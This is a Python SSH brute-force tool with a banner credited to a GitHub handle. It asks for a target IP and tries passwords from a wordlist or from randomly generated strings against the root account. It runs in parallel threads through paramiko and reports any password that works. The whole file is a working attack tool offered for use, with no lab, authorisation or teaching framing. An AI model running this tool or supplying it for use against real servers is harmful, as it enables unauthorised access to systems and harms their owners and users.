import os
import string
import random
from concurrent.futures import ThreadPoolExecutor
import paramiko

print("""
  ___ ___ _  _   ___          _       
 / __/ __| || | | _ )_ _ _  _| |_ ___ 
 \__ \__ \ __ | | _ \ '_| || |  _/ -_)
 |___/___/_||_| |___/_|  \_,_|\__\___|
                                      
By https://github.com/Dynam1c-52
""")

sshserver = input("Target IP: ")
prlyroot = "root"

while True:
    print("1) Wordlist\n2) Random")
    choice = input("Enter module(1-2):")
    if choice == '1':
        wordlist = input("Path to wordlist: ")
        with open(wordlist, "r", encoding="latin1") as f:
            ranpswd = [line.strip() for line in f]
        break
    elif choice == '2':
        while True:
            howlong = int(input("Length of password(1-100): "))
            if howlong < 1 or howlong > 100:
                print("Error(1-100)!")
            else:
                break

        while True:
            howmuch = int(input("Number of passwords to generate(1-1000000): "))
            if howmuch < 1 or howmuch > 1000000:
                print("Error(1-1000000)!")
            else:
                break

        ranpswd = []
        for i in range(howmuch):
            chars = string.ascii_letters + string.digits + string.punctuation
            pswd = ''.join(random.choices(chars, k=howlong))
            ranpswd.append(pswd)
        break
    else:
        print("Error!")

while True:
    threads = int(input("Threads to use(1-10): "))
    if threads < 1 or threads > 10:
        print("Error(1-10)!")
    else:
        break

def list(pswd):
    print(f"Attempting password > {pswd}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(sshserver, username=prlyroot, password=pswd)
        print(f"Recovered > {pswd}")
        os._exit(1)
    except paramiko.ssh_exception.AuthenticationException:
        return ('Error', pswd)
    except paramiko.ssh_exception.SSHException:
        return ('Error', pswd)
    finally:
        ssh.close()

with ThreadPoolExecutor(max_workers=threads) as executor:
    results = executor.map(list, ranpswd)
